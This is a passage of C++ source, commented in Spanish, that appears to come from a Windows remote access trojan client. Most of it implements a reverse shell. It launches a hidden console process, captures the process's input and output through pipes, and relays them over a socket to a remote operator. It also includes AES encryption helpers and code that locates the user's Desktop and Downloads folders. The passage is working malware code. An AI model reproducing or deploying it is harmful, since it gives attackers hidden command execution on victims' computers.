    ByteArray::size_type enc_len = Aes256::encrypt(this->bKey, pInput, pLen, bOutput);
    if (enc_len <= 0) {
        DebugPrint("Error encriptando el buffer");
    }
    return bOutput;
}

ByteArray Cliente::bDec(const unsigned char* pInput, size_t pLen) {
    ByteArray bOutput;
    ByteArray::size_type dec_len = Aes256::decrypt(this->bKey, pInput, pLen, bOutput);
    if (dec_len <= 0) {
        DebugPrint("Error desencriptando");
    }
    return bOutput;
}

//Misc
std::string Cliente::ObtenerDesk() {
    TCHAR szTemp[MAX_PATH];
    if (SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, szTemp) == S_OK) {
        return std::string(szTemp) + "\\";
    }
    return std::string("-");
}

std::string Cliente::ObtenerDown() {
    TCHAR szTemp[MAX_PATH];
    std::string strRutaDesc = "";
    WIN32_FIND_DATA win32Archivo_1;
    if (GetEnvironmentVariable("USERPROFILE", (LPSTR)szTemp, sizeof(szTemp)) > 0) {
        strRutaDesc = szTemp;
        strRutaDesc += "\\Descargas";
        if (FindFirstFileA(strRutaDesc.c_str(), &win32Archivo_1) != INVALID_HANDLE_VALUE) {
            return strRutaDesc + "\\";
        }
        else {
            strRutaDesc = szTemp;
            strRutaDesc += "\\Downloads";
            if (FindFirstFileA(strRutaDesc.c_str(), &win32Archivo_1) != INVALID_HANDLE_VALUE) {
                return strRutaDesc + "\\";
            }
            else {
                return std::string("-");
            };
        }
    }
    else {
        return std::string("-");
    }
}

//Reverse shell

bool ReverseShell::SpawnShell(const char* pstrComando) {
    DebugPrint("Lanzando " + std::string(pstrComando));

    this->stdinRd = this->stdinWr = this->stdoutRd = this->stdoutWr = nullptr;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = nullptr;
    sa.bInheritHandle = true;
    if (!CreatePipe(&this->stdinRd, &this->stdinWr, &sa, 0) || !CreatePipe(&this->stdoutRd, &this->stdoutWr, &sa, 0)) {
        DebugPrint("Error creando tuberias");
        return false;
    }
    STARTUPINFO si;
    GetStartupInfo(&si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = this->stdoutWr;
    si.hStdError = this->stdoutWr;
    si.hStdInput = this->stdinRd;

    if (CreateProcess(nullptr, (LPSTR)pstrComando, nullptr, nullptr, true, CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &this->pi) == 0) {
        DebugPrint("No se pudo spawnear la shell");
        return false;
    }
    
    //La shell esta corriendo
    this->isRunning = true;
    DebugPrint("Running!");
    if (this->copy_ptr != nullptr) {
        std::string strRun = "04" + CMD_DEL;
        strRun += "RU";
        this->copy_ptr->cSend(this->sckSocket, strRun.c_str(), strRun.size(), 0, false, nullptr);
    }
    
    this->tRead = std::thread(&ReverseShell::thLeerShell, this, stdoutRd);
    
    return true;
}

void ReverseShell::TerminarShell() {
    
    std::unique_lock<std::mutex> lock(this->mutex_shell);
    this->isRunning = false;
    lock.unlock();

    if (this->tRead.joinable()) {
        this->tRead.join();
    }

    std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Finish);
    strComando += CMD_DEL;
    strComando += "Done...";
    this->copy_ptr->cSend(this->sckSocket, strComando.c_str(), strComando.size()+1, 0, false, nullptr);

    TerminateProcess(this->pi.hProcess, 0);
    if (this->stdinRd != nullptr) {
        CloseHandle(this->stdinRd);
        this->stdinRd = nullptr;
    }
    if (this->stdinWr != nullptr) {
        CloseHandle(this->stdinWr);
        this->stdinWr = nullptr;
    }
    if (this->stdoutRd != nullptr) {
        CloseHandle(this->stdoutRd);
        this->stdoutRd = nullptr;
    }
    if (this->stdoutWr != nullptr) {
        CloseHandle(this->stdoutWr);
        this->stdoutWr = nullptr;
    }
}

void ReverseShell::thLeerShell(HANDLE hPipe) {
    //int iLen = 0; , iRet = 0;
    char cBuffer[4096], cBuffer2[4096 * 2 + 30];
    DWORD dBytesReaded = 0, dBufferC = 0, dBytesToWrite = 0;
    BYTE bPChar = 0;
    while (this->isRunning) {
        if (PeekNamedPipe(hPipe, cBuffer, sizeof(cBuffer), &dBytesReaded, nullptr, nullptr)) {
            if (dBytesReaded > 0) {
                ReadFile(hPipe, cBuffer, sizeof(cBuffer), &dBytesReaded, nullptr);
            }else {
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
                continue;
            }
            for (dBufferC = 0, dBytesToWrite = 0; dBufferC < dBytesReaded; dBufferC++) {
                if (cBuffer[dBufferC] == '\n' && bPChar != '\r') {
                    cBuffer2[dBytesToWrite++] = '\r';
                }
                bPChar = cBuffer2[dBytesToWrite++] = cBuffer[dBufferC];
            }
            cBuffer2[dBytesToWrite] = '\0';

            std::string strOut = std::to_string(EnumComandos::Reverse_Shell_Salida);
            strOut.append(1, CMD_DEL);
            strOut += cBuffer2;
        
            int iEnviado = this->copy_ptr->cSend(this->sckSocket, strOut.c_str(), strOut.size(), 0, false, nullptr);
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
            if (iEnviado <= 0) {
                //Desconectado o se perdio la conexion
                std::unique_lock<std::mutex> lock(this->mutex_shell);
                this->isRunning = false;
                lock.unlock();
                break;
            }

        }else {
            //error peeknamedpipe
            std::unique_lock<std::mutex> lock(this->mutex_shell);
            this->isRunning = false;
            lock.unlock();
            break;
        }
    }
    DebugPrint("[!]thLeerShell finalizada");
}

void ReverseShell::thEscribirShell(std::string pStrInput) {
    if (pStrInput == "exit\r\n") {
        std::unique_lock<std::mutex> lock(this->mutex_shell);
        this->isRunning = false;
        lock.unlock();
    }

    DWORD dBytesWrited = 0;
    //stdinWr tuberia de entrada
    if (!WriteFile(this->stdinWr, pStrInput.c_str(), pStrInput.size(), &dBytesWrited, nullptr)) {
        DebugPrint("Error escribiendo a la tuberia\n-DATA: " + pStrInput);
        std::unique_lock<std::mutex> lock(this->mutex_shell);
        this->isRunning = false;
        lock.unlock();
    }
}

